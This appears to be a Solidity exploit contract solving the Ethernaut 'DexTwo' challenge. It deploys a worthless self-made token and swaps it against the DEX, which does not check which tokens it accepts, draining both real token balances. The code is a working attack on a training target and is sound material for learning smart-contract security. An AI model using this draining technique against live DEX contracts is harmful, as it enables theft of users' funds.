// SPDX-License-Identifier: MIT
import "../../src/DexTwo/DexTwo.sol";
import "forge-std/console.sol";
import "openzeppelin-contracts/utils/math/Math.sol";

pragma solidity ^0.8.0;
contract DexTwoExploit {

    DexTwo public victim;
    address public token1;
    address public token2;
    MaliciousFungibleToken public myToken;

    constructor(address payable _victim){
        victim = DexTwo(_victim);
        token1 = victim.token1();
        token2 = victim.token2();
        myToken = new MaliciousFungibleToken(address(victim), "malicious", "M1", 100);
    }

    function hack() public {
        // Approve the DEX to spend our malicious token
        myToken.approve(address(victim), type(uint256).max);

        // Transfer some of our malicious token to the DEX
        myToken.transfer(address(victim), 10);

        // Swap our malicious tokens for token1
        victim.swap(address(myToken), token1, 10);

        // Swap our malicious tokens for token2
        victim.swap(address(myToken), token2, 20);
    }

    receive() external payable {
    }
}

contract MaliciousFungibleToken is SwappableTokenTwo {

    constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) SwappableTokenTwo(dexInstance, name, symbol, initialSupply) {
    }
}